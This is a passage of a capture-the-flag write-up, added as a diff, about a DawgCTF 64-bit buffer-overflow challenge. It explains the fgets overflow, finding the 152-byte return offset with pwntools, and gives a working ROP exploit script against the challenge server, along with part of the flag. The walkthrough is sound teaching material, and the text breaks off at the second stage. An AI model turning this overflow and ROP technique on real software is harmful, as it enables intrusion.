@@ -1,0 +1,112 @@
+Challenge:
+64 bits in my Ark and Texture (300 points)
+Can you pwn it? No libc or system needed. Just good ol, 64 bit binary exploitation.
+nc connect.umbccd.net 22237
+
+Alongside this, we are provided with a binary file. When we execute the
+file 3 basic questions about x86-64 appear.
+#3 fotos
+
+Once we answer the first three questions (2, 1, 4), the first part of the
+challenge is proposed:
+#1 foto
+
+They ask us to simply jump to a memory address, if we run this binary with
+ghidra or binaryNinja wen can see the first vulnerability.
+
+The main function is using fgets() to read the user input. The problem is that is reading
+(0x200 -> 512) 512 bytes and stores it in a variable buf. But since buf is defined as
+int64_t it means it can only store 8 bytes.
+
+This leads us to a buffer overflow vulnerability, since we can input more bytes than
+the variable is able to deal with we can overwrite memory addresses.
+For us to make a call to another function we need to understand some basic things.
+
+Once a function finishes it knows where to jump thanks to the return pointer that stores
+the address of the next function. So the first thing we need to know is how much data we
+need to input before overwriting this pointer. For this I'm goint to be using gdb with pwn.
+
+First we run in our terminal gdb ./chall, when we are alredy inside of pwndgb we can enter the
+command run and answer the questions. Once we answer them we have to make a little script with
+python that will allow as to know the number of character we need to introduce.
+#Foto preguntas
+
+These 3 lines of code allow us to create a pattern, lets say for example 200. Once we have that
+we print it and copy it to out clipboard.
+
+```python
+from pwn import *
+pattern = cyclic(200)
+print(pattern.decode())
+```
+
+Now we can enter this pattern.
+#Foto
+
+We can see that the program failed, we accessed something that we shouldn't in the memory and it
+broke. But if we scroll down a little bit we can see some interesting report that pwndgb shows to us.
+#Foto
+
+We can see the value of rsp (the return pointer address) with some letter that seem familiar, the pattern
+we introduced. With another line of code we can see how many chars we need to reach the rsp.
+
+#foto
+
+```python
+print(cyclic_find("naaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab\n"))
+```
+
+And this prints 152, meaning that after 152 characters we can point to wherever we want and the program will
+jump there.
+
+We are going to use another python file to complete this task.
+
+```python
+
+from pwn import *
+
+# Load the binary as an ELF object. We set checksec to False to skip security checks
+# if we already know the result (you can check manually with: checksec --file=./chall)
+elf = ELF("./chall", checksec=False)
+
+# It's good practice to define the context so pwntools knows we are working with a 64-bit x86 binary
+context.binary = elf
+
+# Open the remote connection
+p = remote("connect.umbccd.net", 22237)
+
+print(p.recv().decode("utf-8"))
+
+# Send the correct answers to the initial quiz questions
+p.sendline("2")
+print(p.recv().decode("utf-8"))
+
+p.sendline("1")
+print(p.recv().decode("utf-8"))
+
+p.sendline("4")
+print(p.recv().decode("utf-8"))
+
+print(p.recv().decode("utf-8"))
+
+# ------- PAYLOAD 1 ----------
+# Create a ROP (Return Oriented Programming) object to build the payload.
+# The payload is constructed locally using the ELF binary and then sent to the remote process.
+rop = ROP(elf)
+# Fill the buffer with 152 characters, stopping right before the return address
+rop.raw(b'A' * 152)
+# Insert a 'ret' gadget to align the stack (this ensures the stack is 16-byte aligned before a function call)
+# This is sometimes required on x86-64 systems to avoid crashes or undefined behavior.
+rop.raw(p64(rop.find_gadget(['ret']).address))
+rop.call('win1')
+p.sendline(rop.chain())
+```
+With this we can achieve what we wanted but is not enough now they ask us to do the following.
+
+You have passed the first challenge. The next one won't be so simple.
+Lesson 2 Arguments: Research how arguments are passed to functions and apply your learning. Bring the artifact of 0xDEADBEEF to
+the temple of 0x401314 to claim your advance.DawgCTF{C0ngR4tul4t10ns_
+Continue:
+
+We need to call another function but in this case with an argument. Now we need to understand how to call a function with an argument
+
